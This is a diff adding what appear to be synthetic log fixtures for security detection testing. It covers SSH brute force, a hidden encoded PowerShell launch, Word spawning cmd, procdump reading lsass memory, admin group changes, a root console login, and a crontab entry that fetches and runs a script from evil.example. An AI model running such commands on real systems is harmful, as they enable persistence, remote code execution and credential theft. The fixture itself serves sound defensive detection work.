@@ -1,0 +1,15 @@
+{"timestamp":"2026-03-01T10:00:00Z","service":"sshd","outcome":"failure","src_ip":"203.0.113.50","user":"root"}
+{"timestamp":"2026-03-01T10:00:05Z","service":"sshd","outcome":"failure","src_ip":"203.0.113.50","user":"admin"}
+{"timestamp":"2026-03-01T10:00:09Z","service":"sshd","outcome":"failure","src_ip":"203.0.113.50","user":"ubuntu"}
+{"timestamp":"2026-03-01T10:00:12Z","service":"sshd","outcome":"failure","src_ip":"203.0.113.50","user":"test"}
+{"timestamp":"2026-03-01T10:00:20Z","service":"sshd","outcome":"failure","src_ip":"203.0.113.50","user":"oracle"}
+{"timestamp":"2026-03-01T10:01:00Z","service":"sshd","outcome":"failure","src_ip":"198.51.100.7","user":"joao"}
+{"timestamp":"2026-03-01T10:02:00Z","service":"sshd","outcome":"success","src_ip":"198.51.100.7","user":"joao"}
+{"timestamp":"2026-03-01T11:15:00Z","process":{"image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","command_line":"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoA..."}}
+{"timestamp":"2026-03-01T11:16:00Z","process":{"image":"C:\\Windows\\System32\\cmd.exe","parent_image":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","command_line":"cmd.exe /c whoami"}}
+{"timestamp":"2026-03-01T11:20:00Z","target":{"image":"C:\\Windows\\System32\\lsass.exe"},"source":{"image":"C:\\Users\\Public\\procdump.exe"},"granted_access":"0x1410"}
+{"timestamp":"2026-03-01T11:21:00Z","target":{"image":"C:\\Windows\\System32\\lsass.exe"},"source":{"image":"C:\\Windows\\System32\\svchost.exe"},"granted_access":"0x1410"}
+{"timestamp":"2026-03-01T12:00:00Z","event_id":4732,"group_name":"Administrators","member":"svc-backup"}
+{"timestamp":"2026-03-01T12:30:00Z","event_name":"ConsoleLogin","user_identity":{"type":"Root"},"response":{"ConsoleLogin":"Success"}}
+{"timestamp":"2026-03-01T13:00:00Z","process":{"name":"crontab","command_line":"crontab -l | { cat; echo '*/5 * * * * curl -s http://evil.example/x.sh | sh'; } | crontab -"}}
+{"timestamp":"2026-03-01T13:05:00Z","process":{"name":"ls","command_line":"ls -la"}}
